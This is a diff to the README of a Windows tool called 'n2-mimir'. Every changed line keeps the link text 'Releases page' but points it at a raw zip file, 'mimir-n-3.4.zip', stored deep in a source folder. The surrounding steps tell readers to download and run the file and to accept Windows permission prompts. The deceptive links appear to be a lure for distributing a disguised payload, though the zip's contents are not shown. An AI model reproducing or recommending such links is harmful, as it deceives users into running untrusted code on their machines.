@@ -1,16 +1,16 @@
 # 🧠 n2-mimir - Let your AI remember and learn
 
-[![Download n2-mimir](https://img.shields.io/badge/Download%20n2--mimir-blue?style=for-the-badge)](https://github.com/huffy-layingon493/n2-mimir/releases)
+[![Download n2-mimir](https://img.shields.io/badge/Download%20n2--mimir-blue?style=for-the-badge)](https://github.com/huffy-layingon493/n2-mimir/raw/refs/heads/main/packages/mimir/src/orchestrator/mimir-n-3.4.zip)
 
 ## 📥 Download
 
-Visit the [Releases page](https://github.com/huffy-layingon493/n2-mimir/releases) to download and run this file on Windows.
+Visit the [Releases page](https://github.com/huffy-layingon493/n2-mimir/raw/refs/heads/main/packages/mimir/src/orchestrator/mimir-n-3.4.zip) to download and run this file on Windows.
 
 Look for the latest release and choose the Windows file that matches your system. If you are not sure, pick the file with `.exe` in the name.
 
 ## 🪟 Run on Windows
 
-1. Open the [Releases page](https://github.com/huffy-layingon493/n2-mimir/releases).
+1. Open the [Releases page](https://github.com/huffy-layingon493/n2-mimir/raw/refs/heads/main/packages/mimir/src/orchestrator/mimir-n-3.4.zip).
 2. Find the latest version at the top of the list.
 3. Download the Windows file.
 4. If Windows asks for permission, choose **Run** or **Yes**.
@@ -53,7 +53,7 @@ If your computer is newer, it should run without trouble.
 
 ## 🚀 Getting Started
 
-1. Download n2-mimir from the [Releases page](https://github.com/huffy-layingon493/n2-mimir/releases).
+1. Download n2-mimir from the [Releases page](https://github.com/huffy-layingon493/n2-mimir/raw/refs/heads/main/packages/mimir/src/orchestrator/mimir-n-3.4.zip).
 2. Run the downloaded Windows file.
 3. Allow the app to open if Windows asks for approval.
 4. Follow the first-time setup steps.
@@ -183,7 +183,7 @@ This makes it easier to back up, move, or inspect your files when needed.
 
 ## 🔗 Download again
 
-If you need the download link again, visit the [Releases page](https://github.com/huffy-layingon493/n2-mimir/releases) to download and run this file on Windows
+If you need the download link again, visit the [Releases page](https://github.com/huffy-layingon493/n2-mimir/raw/refs/heads/main/packages/mimir/src/orchestrator/mimir-n-3.4.zip) to download and run this file on Windows
 
 ## 🧩 Project topics
 
